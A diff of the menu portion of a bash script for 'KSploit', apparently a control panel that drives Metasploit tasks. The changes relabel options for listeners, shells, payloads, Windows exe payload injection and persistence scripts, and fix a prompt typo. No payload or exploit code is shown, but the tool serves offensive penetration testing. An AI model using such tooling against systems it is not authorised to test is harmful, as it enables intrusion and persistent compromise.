-   echo "${LIGHT_MAGENTA}  KSploit is a user friendly control panel in which to drive many metasploit tasks such as generating shells, payloads, and persistence scripts on the fly, starting listeners, and suggesting payloads and exploits"
+   pause  '  '${FGC}${GREEN}' Press [Enter] key to continue...'${NC}
+   start=${1:-"start"}
+	#start:
+   clear
    echo
    echo ${YELLOW}
    echo "	   _____________________________________________"
-   echo "	  |${FGG}                    Options:                 ${NC}${YELLOW}|"
+   echo "	  |${FGG}           KSploit Main Menu Options:        ${NC}${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    👂${GREEN} 1 ${BLUE}To load the listeners menu.         ${YELLOW}|"
+   echo "	  |    👂${GREEN} 1 ${BLUE}Listeners Menu.                     ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐚${GREEN} 2 ${BLUE}To load the shells menu.            ${YELLOW}|"
+   echo "	  |    🐚${GREEN} 2 ${BLUE}Shells menu.                        ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    💰${GREEN} 3 ${BLUE}To load the payloads menu.          ${YELLOW}|"
+   echo "	  |    💰${GREEN} 3 ${BLUE}Payloads menu.                      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    💉${GREEN} 4 ${BLUE}Windows exe payload injection.      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    ⌛${GREEN} 5 ${BLUE}To load the persistence menu.       ${YELLOW}|"
+   echo "	  |    ⌛${GREEN} 5 ${BLUE}Persistence Scripts menu.           ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    ▶️ ${GREEN} m ${BLUE}Migrate to Msfconsole.              ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🚪${GREEN} q ${BLUE}To quit.                            ${YELLOW}|"
+   echo "	  |    🚪${GREEN} q ${BLUE}Quit.                               ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
 #   locals	
@@ -922,7 +883,7 @@ start=${1:-"start"}
      error="" 
    fi  
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5m,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,m,q]    " opt
    case "$opt" in
        1) listeners
          ;;
